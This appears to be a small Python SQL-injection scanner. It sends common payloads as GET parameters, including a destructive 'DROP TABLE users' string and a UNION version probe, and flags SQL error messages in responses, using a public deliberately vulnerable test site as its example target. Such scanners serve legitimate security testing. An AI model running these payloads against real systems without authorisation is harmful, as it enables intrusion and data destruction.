import requests

# Common SQL Injection Payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT null, version();--",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' AND 1=0 --",
]

def test_sql_injection(url, params):
    """
    Test for SQL Injection vulnerabilities in a given URL and parameters.
    
    :param url: Target URL to test
    :param params: List of input field names
    """
    vulnerable = False

    for param in params:
        for payload in SQL_PAYLOADS:
            # Inject payload into the specific parameter
            data = {p: (payload if p == param else "test") for p in params}
            
            try:
                response = requests.get(url, params=data, timeout=5)
                response_text = response.text.lower()

                # Basic SQL error messages indicating vulnerability
                if any(error in response_text for error in ["sql syntax", "mysql_fetch", "syntax error"]):
                    print(f"[!] SQL Injection detected on {url} with {param}={payload}")
                    vulnerable = True
                    break  # Stop testing if vulnerability is found
            
            except requests.RequestException:
                print(f"[ERROR] Failed to connect to {url}")

    if not vulnerable:
        print("[INFO] No SQL Injection vulnerabilities detected.")

# Example usage
if __name__ == "__main__":
    target_url = "http://testphp.vulnweb.com/artists.php"
    test_params = ["artist"]  # Modify based on the form field names
    test_sql_injection(target_url, test_params)
